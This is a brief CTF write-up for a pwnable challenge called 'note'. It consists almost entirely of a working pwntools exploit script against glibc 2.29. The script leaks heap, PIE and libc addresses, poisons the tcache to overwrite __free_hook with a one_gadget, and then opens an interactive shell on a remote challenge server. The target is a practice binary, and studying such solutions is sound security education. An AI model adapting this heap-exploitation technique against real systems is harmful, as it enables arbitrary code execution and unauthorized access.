# **note**

#### tag : pwnable, tcache

-----------------------------------------------

#### Description

>Glibc 2.29 tcache exploit

-----------------------------------------------

#### Solution

```python
from pwn import *

DEBUG = [True,False][1]
if DEBUG:
    context.log_level = 'debug'
    r = process('./note')
    gdb.attach(r)
else:
    r = remote('problem.harekaze.com', 20003)

# offset from binaries
elf = ELF('./note')
puts_got_offset = elf.got['puts']
libc = elf.libc
libc_puts_offset = libc.symbols['puts']
libc_free_hook_offset = libc.symbols['__free_hook']
one_gadget_offset = [0xe237f,0xe2383,0xe2386,0x106ef8][3]

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))
s0 = lambda x: r.send(str(x))
go = lambda x: (rr(': '), ss(x))

def create(c):
    go(1)
    rr(': ')
    ss(c)

def write(c,s,n):
    go(2)
    rr(': ')
    ss(c)
    rr(': ')
    ss(s)
    rr(': ')
    ss(n)

def show(c):
    go(3)
    rr(': ')
    ss(c)
    return rr('\n')

def delete(c):
    go(4)
    rr(': ')
    ss(c)

# stage1: leak heap base address
create('a')
create('b')
create('c')
create('d')
create('e')
write('e', 40, 'A'*0x10)
delete('e')
write('d', 40, 'B'*0x20)
delete('d')
create('d')
create('e')
leak_heap = (u64(show('e')[:-1].ljust(8,'\x00')))
heap_base = leak_heap - 0x2c0
log.info('heap base : 0x%x' % heap_base)

# stage2: leak bss pie address
create('f')
write('f', 40, 'B'*0x20 + p64(heap_base+0x270)[:-1])
delete('f')
create('f')
create('g')

leak_bss = (u64(show('g')[:-1].ljust(8,'\x00')))
pie_base = leak_bss - 0x4080
puts_got = pie_base + puts_got_offset
fake_chunk = pie_base + 0x4068
log.info('pie base : 0x%x' % pie_base)
log.info('puts got : 0x%x' % puts_got)

# stage3: leak libc address
create('h')
write('h', 40, 'B'*0x20 + p64(puts_got)[:-1])
delete('h')
create('h')
create('i')

libc_puts = (u64(show('i')[:-1].ljust(8,'\x00')))
libc_base = libc_puts - libc_puts_offset
libc_free_hook = libc_base + libc_free_hook_offset
one_gadget = libc_base + one_gadget_offset
log.info('libc base : 0x%x' % libc_base)

# stage4: tcache poisoning with tcache house of spirit
create('j')
write('j', 40, 'A'*8)

create('k')
write('k', 40, 'A'*8)

delete('j')
delete('k')

create('j')
create('k')
# this will refer fake chunk address
write('k', 40, 'a'*0x20 + p64(heap_base + 0x4e0)[:-1])

delete('k')

create('l')
create('m')
create('n')

fake_chunk = p64(0) + p64(0x51)
write('n', 80, fake_chunk)

delete('m')
delete('n')

create('m')
create('n')
create('o')
# this will poisoning tcache bin
write('o', 80, 'a'*0x10 + p64(libc_free_hook))

create('p')
create('q')
write('p', 60, 'a'*0x10)
write('q', 60, p64(one_gadget))

# trigger free_hook
delete('p')
r.interactive()
```
